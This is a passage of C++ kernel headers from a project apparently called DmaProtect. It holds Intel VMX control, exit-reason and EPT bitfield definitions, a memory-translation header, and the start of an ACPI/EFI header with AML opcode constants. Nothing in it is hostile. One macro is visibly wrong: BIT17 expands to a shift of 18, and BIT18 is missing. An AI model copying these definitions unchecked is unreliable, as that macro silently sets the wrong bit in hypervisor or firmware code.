        unsigned int ConcealVmxFromPt : 1;
        unsigned int ClearIa32RtitCtl : 1;
        unsigned int ReservedBit26 : 1;
        unsigned int ReservedBit27 : 1;
        unsigned int LoadCetState : 1;
        unsigned int ReservedBit29 : 1;
        unsigned int ReservedBit30 : 1;
        unsigned int ReservedBit31 : 1;
    } fields;
};
static_assert(sizeof(VmexitControls) == sizeof(unsigned int));

// Consult with the IA32_VMX_ENTRY_CTLS and IA32_VMX_TRUE_ENTRY_CTLS
// to determine how to set the reserved bits:
union VmentryControls
{
    unsigned int val;
    struct
    {
        unsigned int ReservedBit0 : 1;
        unsigned int ReservedBit1 : 1;
        unsigned int LoadDebugControls : 1; // Whether DR7 and the IA32_DEBUGCTL are loaded on VM entry
        unsigned int ReservedBit3 : 1;
        unsigned int ReservedBit4 : 1;
        unsigned int ReservedBit5 : 1;
        unsigned int ReservedBit6 : 1;
        unsigned int ReservedBit7 : 1;
        unsigned int ReservedBit8 : 1;
        unsigned int Ia32ModeGuest : 1; // Whether a logical processor is in IA-32e mode on VM entry, its value loaded into IA32_EFER.LMA as part of VM entry
        unsigned int EntryToSmm : 1;
        unsigned int DeactivateDualMonitorTreatment : 1;
        unsigned int ReservedBit12 : 1;
        unsigned int LoadIa32PerfGlobalCtrl : 1;
        unsigned int LoadIa32Pat : 1;
        unsigned int LoadIa32Efer : 1;
        unsigned int LoadIa32BndCfgs : 1;
        unsigned int ConcealVmxFromPt : 1;
        unsigned int LoadIa32RtitCtl : 1;
        unsigned int ReservedBit19 : 1;
        unsigned int LoadCetState : 1;
        unsigned int ReservedBit21 : 1;
        unsigned int ReservedBit22 : 1;
        unsigned int ReservedBit23 : 1;
        unsigned int ReservedBit24 : 1;
        unsigned int ReservedBit25 : 1;
        unsigned int ReservedBit26 : 1;
        unsigned int ReservedBit27 : 1;
        unsigned int ReservedBit28 : 1;
        unsigned int ReservedBit29 : 1;
        unsigned int ReservedBit30 : 1;
        unsigned int ReservedBit31 : 1;
    } fields;
};
static_assert(sizeof(VmentryControls) == sizeof(unsigned int));

// Consult with the IA32_VMX_PROCBASED_CTLS2 to determine
// which bits may be set to 1:
union SecondaryProcessorBasedVmExecutionControls
{
    unsigned int val;
    struct
    {
        unsigned int VirtualizeApicAccesses : 1;
        unsigned int EnableEpt : 1;
        unsigned int DescriptorTableExiting : 1;
        unsigned int EnableRdtscp : 1;
        unsigned int Virtualizex2ApicMode : 1;
        unsigned int EnableVpid : 1;
        unsigned int WbinvdExiting : 1;
        unsigned int UnrestrictedGuest : 1;
        unsigned int ApicRegisterVirtualization : 1;
        unsigned int VirtualInterruptDelivery : 1;
        unsigned int PauseLoopExiting : 1;
        unsigned int RdrandExiting : 1;
        unsigned int EnableInvpcid : 1;
        unsigned int EnableVmFunctions : 1;
        unsigned int VmcsShadowing : 1;
        unsigned int EnableEnclsExiting : 1;
        unsigned int RdseedExiting : 1;
        unsigned int EnablePml : 1;
        unsigned int EptViolation : 1;
        unsigned int ConcealVmxFromPt : 1;
        unsigned int EnableXsavesXrstors : 1;
        unsigned int ReservedBit21 : 1; // Reserved to 0
        unsigned int ModBasedExecuteControlForEpt : 1;
        unsigned int SubPageWritePermissionsForEpt : 1;
        unsigned int IntelPtUsesGuestPhysicalAddresses : 1;
        unsigned int UseTscScaling : 1;
        unsigned int EnableUserWaitAndPause : 1;
        unsigned int ReservedBit27 : 1; // Reserved to 0
        unsigned int EnableEnclvExiting : 1;
        unsigned int ReservedBit29 : 1; // Reserved to 0
        unsigned int ReservedBit30 : 1; // Reserved to 0
        unsigned int ReservedBit31 : 1; // Reserved to 0
    } fields;
};
static_assert(sizeof(SecondaryProcessorBasedVmExecutionControls) == sizeof(unsigned int));

enum class InterruptionType
{
    ExternalInterrupt = 0,
    Reserved = 1,
    NonMaskableInterrupt = 2, // NMI
    HardwareException = 3, // e.g. #PF
    SoftwareInterrupt = 4, // INT n, #BP, #OF (overflow)
    PrivilegedSoftwareException = 5, // INT1 (#DB)
    SoftwareException = 6, // INT3 or INT0
    OtherEvent = 7
};

union VmentryInterruptionInformation
{
    unsigned int val;
    struct
    {
        unsigned int VectorOfInterruptOrException : 8; // Which entry in the IDT is used or which other event is injected
        unsigned int InterruptionType : 3; // See the INTERRUPTION_TYPE enum above
        unsigned int DeliverErrorCode : 1; // 0 - do not deliver, 1 - deliver (pushed an error code on the guest stack)
        unsigned int Reserved : 19;
        unsigned int Valid : 1;
    } fields;
};
static_assert(sizeof(VmentryInterruptionInformation) == sizeof(unsigned int));

union ExitReason
{
    unsigned int val;
    struct
    {
        unsigned int BasicExitReason : 16; // See the VMX_EXIT_REASON enum above
        unsigned int AlwaysClearedToZero : 1;
        unsigned int ReservedAsZero0 : 10;
        unsigned int VmexitWasIncidentToEnclaveMode : 1;
        unsigned int PendingMtfVmexit : 1;
        unsigned int VmexitFromVmxRootOperation : 1;
        unsigned int ReservedAsZero1 : 1;
        unsigned int VmentryFailure : 1; // 0 - true VM exit, 1 - VM-entry failure
    } fields;
};
static_assert(sizeof(ExitReason) == sizeof(unsigned int));

union VmexitInterruptionInformation
{
    unsigned int val;
    struct
    {
        unsigned int VectorOfInterruptOrException : 8; // Which entry in the IDT is used or which other event is injected
        unsigned int InterruptionType : 3; // See the INTERRUPTION_TYPE enum above
        unsigned int ErrorCodeValid : 1; // 0 - invalid, 1 - valid
        unsigned int NmiUnblockingDueToIret : 1;
        unsigned int Reserved : 18;
        unsigned int Valid : 1;
    } fields;
};
static_assert(sizeof(VmexitInterruptionInformation) == sizeof(unsigned int));

union IdtVectoringInformation
{
    unsigned int val;
    struct
    {
        unsigned int VectorOfInterruptOrException : 8; // Which entry in the IDT is used or which other event is injected
        unsigned int InterruptionType : 3; // See the INTERRUPTION_TYPE enum above
        unsigned int Undefined : 1; // 0 - invalid, 1 - valid
        unsigned int NmiUnblockingDueToIret : 1;
        unsigned int Reserved : 18;
        unsigned int Valid : 1;
    } fields;
};
static_assert(sizeof(IdtVectoringInformation) == sizeof(unsigned int));

union ExitQualification
{
    unsigned long long val;

    struct
    {
        unsigned long long BreakpointConditions : 4; // B0..B3 conditions in DR7
        unsigned long long Reserved0 : 9;
        unsigned long long BD : 1; // Debug register access detected
        unsigned long long BS : 1; // Single instruction (RFLAGS.TF == 1 && IA32_DEBUGCTL.BTF == 0) or branch (RFLAGS.TF == IA32_DEBUGCTL.BTF == 1)
        unsigned long long Reserved1 : 1;
        unsigned long long RTM : 1; // #DB or #BP occured inside an RTM region
        unsigned long long Reserved2 : 47;
    } DebugExceptions;

    struct
    {
        unsigned long long LinearAddress;
    } invlpg;

    struct
    {
        unsigned long long InstructionDisplacementField;
    } invept, invpcid, invvpid,
        lgdt, lidt, lldt, ltr,
        sgdt, Sidt, sldt, str,
        vmclear, vmptrld, vmptrst, vmread, vmwrite, vmxon,
        xrstors, xsaves;

    struct
    {
        unsigned long long SelectorOfTss : 16; // To which the guest attempted to switch
        unsigned long long Reserved0 : 14;
        unsigned long long SourceOfTaskSwitchInitiation : 2; // 0 = CALL, 1 = IRET, 2 = JMP, 3 = Task gate in IDT
        unsigned long long Reserved1 : 32;
    } TaskSwitch;

    struct
    {
        unsigned long long NumberOfControlRegister : 4; // 0 for CLTS and LMSW
        unsigned long long AccessType : 2; // 0 = MOV to CR, 1 = MOV from CR, 2 = CLTS, 3 = LMSW
        unsigned long long LmswOperandType : 1; // 0 = register, 1 = memory (0 for MOV CR and CLTS)
        unsigned long long Reserved0 : 1;
        unsigned long long Register : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned long long Reserved1 : 4;
        unsigned long long LmswSourceData : 16; // For CLTS and MOV CR cleared to 0
        unsigned long long Reserved2 : 32;
    } ControlRegistersAccess;

    struct
    {
        unsigned long long NumberOfDebugRegister : 3;
        unsigned long long Reserved0 : 1;
        unsigned long long DirectionOfAccess : 1; // 0 = MOV to DR, 1 = MOV from DR
        unsigned long long Reserved1 : 3;
        unsigned long long Register : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned long long Reserved2 : 52;
    } MovDr;

    struct
    {
        unsigned long long SizeOfAccess : 3; // 0 = 1-byte, 1 = 2-byte, 3 = 4-byte
        unsigned long long Direction : 1; // 0 = OUT, 1 = IN
        unsigned long long StringInstruction : 1; // 0 = not string instruction, 1 = string instruction
        unsigned long long RepPrefixed : 1; // 0 = no REP, 1 = prefixed with REP
        unsigned long long OperandEncoding : 1; // 0 = DX, 1 = immediate
        unsigned long long Reserved0 : 9;
        unsigned long long PortNumber : 16; // As specified in DX or in an immediate operand
        unsigned long long Reserved1 : 32;
    } IoInstructions;

    struct
    {
        unsigned long long OffsetInApicPage : 12; // Undefined if the APIC-access VM exit is due a guest-physical access
        unsigned long long AccessType : 4; // 0 = linear access for a data read during instruction execution
                                            // 1 = linear access for a data write during instruction execution
                                            // 2 = linear access for an instruction fetch
                                            // 3 = linear access (read or write) during event delivery
                                            // 10 = guest-physical access during event delivery
                                            // 15 = guest-physical access for an instruction fetch or during instruction execution
        unsigned long long AsynchronousAndNotEventDelivery : 1;
        unsigned long long Reserved0 : 47;
    } ApicAccess;

    struct
    {
        unsigned long long AccessedRead : 1;
        unsigned long long AccessedWrite : 1;
        unsigned long long AccessedExecute : 1;
        unsigned long long GuestPhysicalReadable : 1;
        unsigned long long GuestPhysicalWriteable : 1;
        unsigned long long GuestPhysicalExecutable : 1;
        unsigned long long GuestPhysicalUserExecutable : 1;
        unsigned long long GuestLinearAddressFieldIsValid : 1;
        unsigned long long AccessToGuestPhysicalAddress : 1; // Only valid if 'GuestLinearAddressFieldIsValid' equals 1
        unsigned long long UserModeLinearAddress : 1;
        unsigned long long TranslatesToReadWritePage : 1; // 0 = Readonly, 1 = ReadWrite
        unsigned long long TranslatesToNonExecutablePage : 1; // 0 = Executable, 1 = Non-executable
        unsigned long long NmiUnblockingDueToIret : 1;
        unsigned long long IsShadowStackAccess : 1;
        unsigned long long TranslatesToShadowStackPage : 1;
        unsigned long long Reserved0 : 1;
        unsigned long long AsynchronousAndNotEventDelivery : 1;
        unsigned long long Reserved1 : 47;
    } EptViolations;
};
static_assert(sizeof(ExitQualification) == sizeof(unsigned long long));

// Extended-Page-Table Pointer:
union Eptp
{
    unsigned long long val;
    struct
    {
        unsigned long long EptMemoryType : 3; // 0 = Uncacheable, 6 = Write-back, other values are reserved
        unsigned long long PageWalkLength : 3; // This value is 1 less than the EPT page-walk length
        unsigned long long AccessedAndDirtyFlagsSupport : 1; // Setting this control to 1 enables accessed and dirty flags for EPT (check IA32_VMX_EPT_VPID_CAP)
        unsigned long long EnforcementOfAccessRightsForSupervisorShadowStack : 1;
        unsigned long long Reserved0 : 4;
        unsigned long long EptPml4ePhysicalPfn : 52; // Maximum supported physical address width: CPUID(EAX = 0x80000008) -> EAX[7:0]
    } fields;
};
static_assert(sizeof(Eptp) == sizeof(unsigned long long));

// Describes 512-GByte region:
union EptPml4e
{
    unsigned long long val;
    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Reserved0 : 5; // Must be zero
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Ignored0 : 1;
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Ignored1 : 1;
        unsigned long long EptPdptePhysicalPfn : 40; // Maximum supported physical address width: CPUID(EAX = 0x80000008) -> EAX[7:0]
        unsigned long long Ignored2 : 12;
    } page1gb, page2mb, page4kb, generic;
};
static_assert(sizeof(EptPml4e) == sizeof(unsigned long long));

union EptPdpte
{
    unsigned long long val;

    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Reserved0 : 4;
        unsigned long long LargePage : 1;
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Reserved1 : 1;
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Reserved2 : 53;
    } generic;

    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Type : 3;
        unsigned long long IgnorePat : 1;
        unsigned long long LargePage : 1; // Must be 1 (otherwise, this entry references an EPT page directory)
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Dirty : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Ignored0 : 1;
        unsigned long long Reserved0 : 18; // Must be zero
        unsigned long long PagePhysicalPfn : 22; // Physical address of the 1-GByte page referenced by this entry
        unsigned long long Ignored1 : 8;
        unsigned long long SupervisorShadowStackAccess : 1; // Ignored if bit 7 of EPTP is 0
        unsigned long long Ignored2 : 2;
        unsigned long long SuppressVe : 1; // Ignored if "EPT-violation #VE" VM-execution control is 0
    } page1gb;

    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Reserved0 : 5; // Must be zero
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Ignored0 : 1;
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Ignored1 : 1;
        unsigned long long EptPdePhysicalPfn : 40;
        unsigned long long Ignored2 : 12;
    } page2mb, page4kb;
};
static_assert(sizeof(EptPdpte) == sizeof(unsigned long long));

union EptPde
{
    unsigned long long val;

    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Reserved0 : 4; // Must be zero
        unsigned long long LargePage : 1;
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Reserved1 : 1;
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Reserved2 : 53;
    } generic;

    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Type : 3;
        unsigned long long IgnorePat : 1;
        unsigned long long LargePage : 1; // Must be 1 (otherwise, this entry references an EPT page directory)
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Dirty : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Ignored0 : 1;
        unsigned long long Reserved0 : 9; // Must be zero
        unsigned long long PagePhysicalPfn : 31; // Physical address of the 2-MByte page referenced by this entry
        unsigned long long Ignored1 : 8;
        unsigned long long SupervisorShadowStackAccess : 1; // Ignored if bit 7 of EPTP is 0
        unsigned long long Ignored2 : 2;
        unsigned long long SuppressVe : 1; // Ignored if "EPT-violation #VE" VM-execution control is 0
    } page2mb;

    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Reserved0 : 4; // Must be zero
        unsigned long long LargePage : 1; // // Must be 0 (otherwise, this entry references a 2-MByte page)
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Ignored0 : 1;
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Ignored1 : 1;
        unsigned long long EptPtePhysicalPfn : 40;
        unsigned long long Ignored : 12;
    } page4kb;
};
static_assert(sizeof(EptPde) == sizeof(unsigned long long));

union EptPte
{
    unsigned long long val;
    struct
    {
        unsigned long long ReadAccess : 1;
        unsigned long long WriteAccess : 1;
        unsigned long long ExecuteAccess : 1;
        unsigned long long Type : 3;
        unsigned long long IgnorePat : 1;
        unsigned long long Ignored0 : 1;
        unsigned long long Accessed : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long Dirty : 1; // Ignored if bit 6 of EPTP is 0
        unsigned long long UserModeExecuteAccess : 1; // Ignored if "mode-based execute control for EPT" VM-execution control is 0
        unsigned long long Ignored1 : 1;
        unsigned long long PagePhysicalPfn : 40;
        unsigned long long Ignored2 : 8;
        unsigned long long SupervisorShadowStackAccess : 1; // Ignored if bit 7 of EPTP is 0
        unsigned long long SubPageWritePermissions : 1; // Ignored if "sub-page write permissions for EPT" VM-execution control is 0
        unsigned long long Ignored3 : 1;
        unsigned long long SuppressVe : 1; // Ignored if "EPT-violation #VE" VM-execution control is 0
    } page4kb;
};
static_assert(sizeof(EptPte) == sizeof(unsigned long long));

enum class InveptType : unsigned int
{
    SingleContextInvalidation = 1,
    GlobalInvalidation = 2
};

struct InveptDescriptor
{
    unsigned long long Eptp;
    unsigned long long Reserved;
};
static_assert(sizeof(InveptDescriptor) == 2 * sizeof(unsigned long long));

enum class InvvpidType : unsigned int
{
    IndividualAddressInvalidation = 0,
    SingleContextInvalidation = 1,
    AllContextsInvalidation = 2,
    SingleContextInvalidationExceptGlobal = 3
};

struct InvvpidDescriptor
{
    unsigned long long Vpid : 16;
    unsigned long long Reserved : 48;
    unsigned long long LinearAddress;
};
static_assert(sizeof(InvvpidDescriptor) == 2 * sizeof(unsigned long long));

union InstructionInformationField
{
    unsigned int val;

    struct
    {
        unsigned int Undefined0 : 7;
        unsigned int AddressSize : 3; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int Undefined1 : 5;
        unsigned int SegmentRegister : 3; // 0 = ES, 1 = CS, 2 = SS, 3 = DS, 4 = FS, 5 = GS
        unsigned int Undefined2 : 14;
    } ins, outs;

    struct
    {
        unsigned int Scaling : 2; // 0 = No scaling, 1 = Scale by 2, 2 = Scale by 4, 3 = Scale by 8
        unsigned int Undefined0 : 5;
        unsigned int AddressSize : 3; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int ClearedTo0 : 1;
        unsigned int Undefined1 : 4;
        unsigned int SegmentRegister : 3; // 0 = ES, 1 = CS, 2 = SS, 3 = DS, 4 = FS, 5 = GS
        unsigned int IndexReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int IndexRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int BaseReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int BaseRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int Reg2 : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
    } invept, invpcid, invvpid;

    struct
    {
        unsigned int Scaling : 2; // 0 = No scaling, 1 = Scale by 2, 2 = Scale by 4, 3 = Scale by 8
        unsigned int Undefined0 : 5;
        unsigned int AddressSize : 3; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int ClearedTo0 : 1;
        unsigned int OperandSize : 1; // 0 = 16-bit, 1 = 32-bit
        unsigned int Undefined1 : 3;
        unsigned int SegmentRegister : 3; // 0 = ES, 1 = CS, 2 = SS, 3 = DS, 4 = FS, 5 = GS
        unsigned int IndexReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int IndexRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int BaseReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int BaseRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int InstructionIdentity : 2; // 0 = SGDT, 1 = SIDT, 2 = LGDT, 3 = LIDT
        unsigned int Undefined2 : 2;
    } lidt, lgdt, sidt, sgdt;

    struct
    {
        unsigned int Scaling : 2; // 0 = No scaling, 1 = Scale by 2, 2 = Scale by 4, 3 = Scale by 8
        unsigned int Undefined0 : 1;
        unsigned int Reg1 : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int AddressSize : 3; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int MemReg : 1; // 0 = Memory, 1 = Register
        unsigned int Undefined1 : 4;
        unsigned int SegmentRegister : 3; // 0 = ES, 1 = CS, 2 = SS, 3 = DS, 4 = FS, 5 = GS
        unsigned int IndexReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int IndexRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int BaseReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int BaseRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int InstructionIdentity : 2; // 0 = SLDT, 1 = STR, 2 = LLDT, 3 = LTR
        unsigned int Undefined2 : 2;
    } lldt, ltr, sldt, str;

    struct
    {
        unsigned int Undefined0 : 3;
        unsigned int OperandRegister : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int Undefined1 : 4;
        unsigned int OperandSize : 2; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int Undefined2 : 19;
    } rdrand, rdseed, tpause, umwait;

    struct
    {
        unsigned int Scaling : 2; // 0 = No scaling, 1 = Scale by 2, 2 = Scale by 4, 3 = Scale by 8
        unsigned int Undefined0 : 5;
        unsigned int AddressSize : 3; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int ClearedTo0 : 1;
        unsigned int Undefined1 : 4;
        unsigned int SegmentRegister : 3; // 0 = ES, 1 = CS, 2 = SS, 3 = DS, 4 = FS, 5 = GS
        unsigned int IndexReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int IndexRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int BaseReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int BaseRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int Undefined2 : 4;
    } vmclear, vmptrld, vmptrst, vmxon, xrstors, xsaves;

    struct
    {
        unsigned int Scaling : 2; // 0 = No scaling, 1 = Scale by 2, 2 = Scale by 4, 3 = Scale by 8
        unsigned int Undefined0 : 1;
        unsigned int Reg1 : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int AddressSize : 3; // 0 = 16-bit, 1 = 32-bit, 2 = 64-bit
        unsigned int MemReg : 1; // 0 = Memory, 1 = Register
        unsigned int Undefined1 : 4;
        unsigned int SegmentRegister : 3; // 0 = ES, 1 = CS, 2 = SS, 3 = DS, 4 = FS, 5 = GS
        unsigned int IndexReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int IndexRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int BaseReg : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
        unsigned int BaseRegInvalid : 1; // 0 = Valid, 1 = Invalid
        unsigned int Reg2 : 4; // 0 = RAX, 1 = RCX, 2 = RDX, 3 = RBX, 4 = RSP, 5 = RBP, 6 = RSI, 7 = RDI, 8..15 = R8..R15
    } vmread, vmwrite;
};
static_assert(sizeof(InstructionInformationField) == sizeof(unsigned int));



} // namespace Vmx
```

`DmaProtect/include/Memory.h`:

```h
#pragma once
#include "macros.h"

#include <ntddk.h>

namespace Memory {
	UINT64 VirtToPhy(PVOID Va);
	UINT64 PhyToVirt(UINT64 Pa);
}
```

`DmaProtect/include/acpi.h`:

```h
#pragma once

#include "signatures.h"
#include "Memory.h"
#include "cpu.h"
#include "cpp.h"

#define ARRAY_SIZE(Array) (sizeof (Array) / sizeof ((Array)[0]))
#define BIT(x) (1ull << x)
#define BIT0 (1ull << 0)
#define BIT1 (1ull << 1)
#define BIT2 (1ull << 2)
#define BIT3 (1ull << 3)
#define BIT4 (1ull << 4)
#define BIT5 (1ull << 5)
#define BIT6 (1ull << 6)
#define BIT7 (1ull << 7)
#define BIT8 (1ull << 8)
#define BIT9 (1ull << 9)
#define BIT10 (1ull << 10)
#define BIT11 (1ull << 11)
#define BIT12 (1ull << 12)
#define BIT13 (1ull << 13)
#define BIT14 (1ull << 14)
#define BIT15 (1ull << 15)
#define BIT16 (1ull << 16)
#define BIT17 (1ull << 18)
#define BIT19 (1ull << 19)
#define BIT20 (1ull << 20)
#define BIT21 (1ull << 21)
#define BIT22 (1ull << 22)
#define BIT23 (1ull << 23)
#define BIT24 (1ull << 24)
#define BIT25 (1ull << 25)
#define BIT26 (1ull << 26)
#define BIT27 (1ull << 27)
#define BIT28 (1ull << 28)
#define BIT29 (1ull << 29)
#define BIT30 (1ull << 30)
#define BIT31 (1ull << 31)
#define BIT32 (1ull << 32)

#define SIZE_2MB (PAGE_SIZE * 512)

//
// The EFI memory allocation functions work in units of EFI_PAGEs that are
// 4KB. This should in no way be confused with the page size of the processor.
// An EFI_PAGE is just the quanta of memory in EFI.
//
#define EFI_PAGE_SIZE   SIZE_4KB
#define EFI_PAGE_MASK   0xFFF
#define EFI_PAGE_SHIFT  12

/**
  Macro that converts a size, in bytes, to a number of EFI_PAGESs.

  @param  Size      A size in bytes.  This parameter is assumed to be type UINTN.
                    Passing in a parameter that is larger than UINTN may produce
                    unexpected results.

  @return  The number of EFI_PAGESs associated with the number of bytes specified
           by Size.

**/
#define EFI_SIZE_TO_PAGES(Size)  (((Size) >> EFI_PAGE_SHIFT) + (((Size) & EFI_PAGE_MASK) ? 1 : 0))

/**
  Macro that converts a number of EFI_PAGEs to a size in bytes.

  @param  Pages     The number of EFI_PAGES.  This parameter is assumed to be
                    type UINTN.  Passing in a parameter that is larger than
                    UINTN may produce unexpected results.

  @return  The number of bytes associated with the number of EFI_PAGEs specified
           by Pages.

**/
#define EFI_PAGES_TO_SIZE(Pages)  ((Pages) << EFI_PAGE_SHIFT)

#define UEFI_DOMAIN_ID          1

#define ACPI_TABLE_GUID \
  { \
    0xeb9d2d30, 0x2d88, 0x11d3, {0x9a, 0x16, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d } \
  }

#define EFI_ACPI_TABLE_GUID \
  { \
    0x8868e871, 0xe4f1, 0x11d3, {0xbc, 0x22, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81 } \
  }

#define ACPI_10_TABLE_GUID  ACPI_TABLE_GUID

//
// ACPI 2.0 or newer tables should use EFI_ACPI_TABLE_GUID.
//
#define EFI_ACPI_20_TABLE_GUID  EFI_ACPI_TABLE_GUID

struct EFI_GUID {
    unsigned int Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char Data4[8];
};

extern EFI_GUID gEfiAcpiTableGuid;
extern EFI_GUID gEfiAcpi10TableGuid;
extern EFI_GUID gEfiAcpi20TableGuid;

typedef UINT64 UINTN;
typedef int EFI_STATUS;

//
// ACPI AML definition
//

//
// Primary OpCode
//
#define AML_ZERO_OP                0x00
#define AML_ONE_OP                 0x01
#define AML_ALIAS_OP               0x06
#define AML_NAME_OP                0x08
#define AML_BYTE_PREFIX            0x0a
#define AML_WORD_PREFIX            0x0b
#define AML_DWORD_PREFIX           0x0c
#define AML_STRING_PREFIX          0x0d
#define AML_QWORD_PREFIX           0x0e
#define AML_SCOPE_OP               0x10
#define AML_BUFFER_OP              0x11
#define AML_PACKAGE_OP             0x12
#define AML_VAR_PACKAGE_OP         0x13
#define AML_METHOD_OP              0x14
#define AML_EXTERNAL_OP            0x15
#define AML_DUAL_NAME_PREFIX       0x2e
#define AML_MULTI_NAME_PREFIX      0x2f
#define AML_NAME_CHAR_A            0x41
#define AML_NAME_CHAR_B            0x42
#define AML_NAME_CHAR_C            0x43
#define AML_NAME_CHAR_D            0x44
#define AML_NAME_CHAR_E            0x45
#define AML_NAME_CHAR_F            0x46
#define AML_NAME_CHAR_G            0x47
#define AML_NAME_CHAR_H            0x48
#define AML_NAME_CHAR_I            0x49
#define AML_NAME_CHAR_J            0x4a
#define AML_NAME_CHAR_K            0x4b
#define AML_NAME_CHAR_L            0x4c
#define AML_NAME_CHAR_M            0x4d
#define AML_NAME_CHAR_N            0x4e
#define AML_NAME_CHAR_O            0x4f
#define AML_NAME_CHAR_P            0x50
#define AML_NAME_CHAR_Q            0x51
#define AML_NAME_CHAR_R            0x52
#define AML_NAME_CHAR_S            0x53
#define AML_NAME_CHAR_T            0x54
#define AML_NAME_CHAR_U            0x55
